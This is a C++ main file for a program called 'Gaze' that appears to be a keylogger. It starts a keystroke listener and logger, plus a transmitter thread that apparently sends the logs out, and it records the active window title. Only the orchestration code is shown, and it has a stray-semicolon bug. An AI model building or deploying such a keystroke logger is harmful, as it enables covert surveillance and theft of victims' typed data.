// Gaze.cpp : This file contains the 'main' function. Program execution begins and ends there.
// all .cpp files must

#include "pch.h"
#include "Listener.h"
#include "Transmitter.h"
#include <iostream>

using namespace std;

int main()
{
	// Start logger and listener
	Logger logger;
	Listener listener(&logger);
	Transmitter transmitter(&logger);

	// Start Transmitter thread
	Thread thread(&Transmitter::Start, &transmitter);
	thread.launch();

	// Test Utilities static methods
	cout << Utilities::GetCurrentDate() << endl;
	cout << Utilities::GetTime() << endl;
	cout << Utilities::GetActiveWindow() << endl;
	cout << Utilities::GetProgramFilePath() << endl;
	cout << Utilities::GetSystemDir() << endl;
	
	// If available load log from file and display it to screen 
	if(logger.LoadFromFile());
		cout << logger.GetLog() << endl;

	// Start listening
	listener.Start();

	// If F1 pressed
	cout << "EXITING!" << endl;

	// Stop thread
	transmitter.Stop();

	// Save log to file
	logger.SaveToFile();

	return 0;
}